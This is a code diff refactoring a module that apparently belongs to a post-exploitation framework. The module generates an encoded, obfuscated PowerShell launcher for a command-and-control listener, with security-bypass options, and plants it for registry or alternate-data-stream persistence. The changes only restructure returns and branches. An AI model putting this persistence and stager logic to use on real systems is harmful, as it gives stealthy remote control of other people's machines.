@@ -67,13 +67,12 @@ class Module:
                 + key_name
                 + ";"
             )
-            script = main_menu.modulesv2.finalize_module(
+            return main_menu.modulesv2.finalize_module(
                 script=script,
                 script_end="",
                 obfuscate=obfuscate,
                 obfuscation_command=obfuscation_command,
             )
-            return script
 
         if ext_file != "":
             # read in an external file as the payload and build a
@@ -89,28 +88,26 @@ class Module:
             else:
                 return handle_error_message("[!] File does not exist: " + ext_file)
 
+        elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
+            # not a valid listener, return nothing for the script
+            return handle_error_message("[!] Invalid listener: " + listener_name)
+
         else:
-            # if an external file isn't specified, use a listener
-            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-                # not a valid listener, return nothing for the script
-                return handle_error_message("[!] Invalid listener: " + listener_name)
+            # generate the PowerShell one-liner with all of the proper options set
+            launcher = main_menu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                user_agent=user_agent,
+                proxy=proxy,
+                proxy_creds=proxy_creds,
+                bypasses=params["Bypasses"],
+            )
 
-            else:
-                # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagergenv2.generate_launcher(
-                    listener_name=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    user_agent=user_agent,
-                    proxy=proxy,
-                    proxy_creds=proxy_creds,
-                    bypasses=params["Bypasses"],
-                )
-
-                enc_script = launcher.split(" ")[-1]
-                status_msg += "using listener " + listener_name
+            enc_script = launcher.split(" ")[-1]
+            status_msg += "using listener " + listener_name
 
         # store the script in the specified alternate data stream location
         if ads_path != "":
@@ -157,10 +154,9 @@ class Module:
 
         script += "'Registry persistence established " + status_msg + "'"
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
